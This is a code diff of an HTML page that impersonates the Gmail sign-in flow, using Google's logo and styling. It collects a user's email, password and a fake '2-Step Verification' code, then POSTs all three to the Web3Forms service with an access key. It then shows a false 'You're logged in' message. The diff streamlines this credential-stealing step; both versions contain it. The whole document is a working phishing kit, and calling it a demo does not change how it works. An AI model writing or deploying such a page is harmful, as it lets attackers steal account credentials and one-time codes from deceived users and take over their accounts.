@@ -7,7 +7,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
- 
+  
   <style>
     :root {
       --google-blue: #1a73e8;
@@ -17,130 +17,32 @@
       --border: #dadce0;
       --success-green: #34a853;
     }
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: 'Google Sans', Arial, sans-serif;
-      background: #f6f8fc;
-      height: 100vh;
-      display: grid;
-      place-items: center;
-      color: var(--text-primary);
-    }
-    .container {
-      background: white;
-      width: 100%;
-      max-width: 450px;
-      padding: 48px 40px 36px;
-      border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
-      text-align: center;
-    }
-    .logo {
-      margin-bottom: 28px;
-    }
-    .logo img {
-      width: 76px;
-      height: 76px;
-    }
-    h1 {
-      font-size: 24px;
-      font-weight: 400;
-      margin-bottom: 8px;
-    }
-    .subtitle {
-      font-size: 16px;
-      color: var(--text-secondary);
-      margin-bottom: 32px;
-    }
-    .input-group {
-      position: relative;
-      margin-bottom: 24px;
-      text-align: left;
-    }
-    .input-group label {
-      position: absolute;
-      top: 14px;
-      left: 16px;
-      color: var(--text-secondary);
-      font-size: 16px;
-      pointer-events: none;
-      transition: all 0.25s ease;
-    }
-    input {
-      width: 100%;
-      padding: 20px 16px 6px;
-      border: 1px solid var(--border);
-      border-radius: 4px;
-      font-size: 16px;
-      outline: none;
-      transition: all 0.2s;
-    }
-    input:focus,
-    input:not(:placeholder-shown) {
-      border-color: var(--google-blue);
-      box-shadow: 0 0 0 1px var(--google-blue);
-    }
-    input:focus + label,
-    input:not(:placeholder-shown) + label {
-      top: 6px;
-      font-size: 12px;
-      color: var(--google-blue);
-    }
-    .btn {
-      background: var(--google-blue);
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 4px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 16px;
-      transition: background 0.2s;
-    }
-    .btn:hover {
-      background: var(--google-blue-hover);
-    }
-    .links {
-      margin-top: 24px;
-      font-size: 14px;
-    }
-    .links a {
-      color: var(--google-blue);
-      text-decoration: none;
-      margin: 0 12px;
-    }
-    .links a:hover {
-      text-decoration: underline;
-    }
-    #successMessage {
-      display: none;
-      margin-top: 40px;
-      padding: 20px;
-      background: #e8f5e9;
-      border: 1px solid var(--success-green);
-      border-radius: 8px;
-      color: var(--success-green);
-      font-size: 18px;
-      font-weight: 500;
-    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:'Google Sans',Arial,sans-serif; background:#f6f8fc; height:100vh; display:grid; place-items:center; color:var(--text-primary); }
+    .container { background:white; width:100%; max-width:450px; padding:48px 40px 36px; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.12),0 1px 2px rgba(0,0,0,0.24); text-align:center; }
+    .logo { margin-bottom:28px; }
+    .logo img { width:76px; height:76px; }
+    h1 { font-size:24px; font-weight:400; margin-bottom:8px; }
+    .subtitle { font-size:16px; color:var(--text-secondary); margin-bottom:32px; }
+    .input-group { position:relative; margin-bottom:24px; text-align:left; }
+    .input-group label { position:absolute; top:14px; left:16px; color:var(--text-secondary); font-size:16px; pointer-events:none; transition:all 0.25s ease; }
+    input { width:100%; padding:20px 16px 6px; border:1px solid var(--border); border-radius:4px; font-size:16px; outline:none; transition:all 0.2s; }
+    input:focus, input:not(:placeholder-shown) { border-color:var(--google-blue); box-shadow:0 0 0 1px var(--google-blue); }
+    input:focus + label, input:not(:placeholder-shown) + label { top:6px; font-size:12px; color:var(--google-blue); }
+    .btn { background:var(--google-blue); color:white; border:none; padding:12px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; width:100%; margin-top:16px; transition:background 0.2s; }
+    .btn:hover { background:var(--google-blue-hover); }
+    .links { margin-top:24px; font-size:14px; }
+    .links a { color:var(--google-blue); text-decoration:none; margin:0 12px; }
+    .links a:hover { text-decoration:underline; }
   </style>
 </head>
 <body>
 
-<div class="container" id="mainContainer">
-  <div class="logo">
-    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-  </div>
+<div class="container" id="container">
+  <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google"></div>
   <h1>Sign in</h1>
   <div class="subtitle">to continue to Gmail</div>
 
-  <!-- Step 1: Email + Password -->
   <div class="input-group">
     <input type="email" id="email" placeholder=" " autocomplete="email" required>
     <label for="email">Email or phone</label>
@@ -155,97 +57,74 @@
     <a href="#">Forgot email?</a>
     <a href="#">Create account</a>
   </div>
-
-  <!-- Success message (hidden at first) -->
-  <div id="successMessage">
-    Success! You're logged in.
-  </div>
 </div>
 
 <script>
-function goTo2FA() {
-  const email = document.getElementById('email').value.trim();
-  const pass = document.getElementById('password').value;
+let emailVal = '', passVal = '';
 
-  if (!email || !pass) {
+function goTo2FA() {
+  emailVal = document.getElementById('email').value.trim();
+  passVal = document.getElementById('password').value;
+
+  if (!emailVal || !passVal) {
     alert("Please fill both fields");
     return;
   }
 
-  // Replace content with 2FA step
-  document.getElementById('mainContainer').innerHTML = `
-    <div class="logo">
-      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-    </div>
+  document.getElementById('container').innerHTML = `
+    <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google"></div>
     <h1>2-Step Verification</h1>
     <div class="subtitle">Enter the code sent to your phone</div>
     <p style="color:var(--text-secondary); margin:16px 0;">We sent a verification code to ••• ••• ••${Math.floor(Math.random()*90+10)}</p>
-    
     <div class="input-group">
       <input type="text" id="code" placeholder=" " maxlength="6" pattern="[0-9]{6}" inputmode="numeric" required>
       <label for="code">Enter 6-digit code</label>
     </div>
-    
-    <button class="btn" onclick="finish()">Verify</button>
-    
+    <button class="btn" onclick="submitData()">Verify</button>
     <div class="links" style="margin-top:32px;">
       <a href="#" onclick="location.reload()">Try another way</a>
     </div>
   `;
 }
 
-function finish() {
+function submitData() {
   const code = document.getElementById('code').value;
 
-  if (code.length === 6 && /^\d+$/.test(code)) {
-    // Show success message on the page
-    document.getElementById('mainContainer').innerHTML = `
-      <div class="logo">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-      </div>
-      <h1>Success!</h1>
-      <p style="font-size:18px; margin-top:20px;">You're logged in.</p>
-      <div id="successMessage">
-        (Demo complete - your email, password, and code were sent)
-      </div>
-    `;
-  } else {
+  if (code.length !== 6 || !/^\d+$/.test(code)) {
     alert("Please enter a valid 6-digit code");
-  }
-}
-</script>
-
-<!-- Web3Forms script to send data (runs automatically when page loads) -->
-<script>
-  // This sends the data only after the form is submitted (on Verify)
-  function sendToWeb3Forms(email, pass, code) {
-    fetch('https://api.web3forms.com/submit', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        access_key: "00d6954a-da4e-4260-81f4-baf67ae5a883",
-        subject: "New Gmail Demo Submission",
-        email: email,
-        password: pass,
-        twofa_code: code
-      })
-    });
+    return;
   }
 
-  // Override finish to also send data
-  const originalFinish = finish;
-  finish = function() {
-    const code = document.getElementById('code').value;
-    const email = document.getElementById('email')?.value || 'N/A'; // fallback if not available
-    const pass = document.getElementById('password')?.value || 'N/A';
-
-    if (code.length === 6 && /^\d+$/.test(code)) {
-      sendToWeb3Forms(email, pass, code); // Send to your email
-      originalFinish(); // Show success
+  // Send to Web3Forms
+  fetch('https://api.web3forms.com/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      access_key: "00d6954a-da4e-4260-81f4-baf67ae5a883",
+      subject: "New Gmail Demo Submission",
+      email: emailVal,
+      password: passVal,
+      twofa_code: code
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.success) {
+      document.getElementById('container').innerHTML = `
+        <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google"></div>
+        <h1>Success!</h1>
+        <p style="font-size:18px; margin-top:20px; color:#34a853;">You're logged in.</p>
+        <p style="margin-top:16px;">(Demo complete - details sent to your email)</p>
+      `;
     } else {
-      alert("Please enter a valid 6-digit code");
+      alert("Submission failed: " + (data.message || "Unknown error"));
     }
-  };
+  })
+  .catch(err => {
+    alert("Network error - check console (F12) for details");
+    console.error(err);
+  });
+}
 </script>
 
 </body>
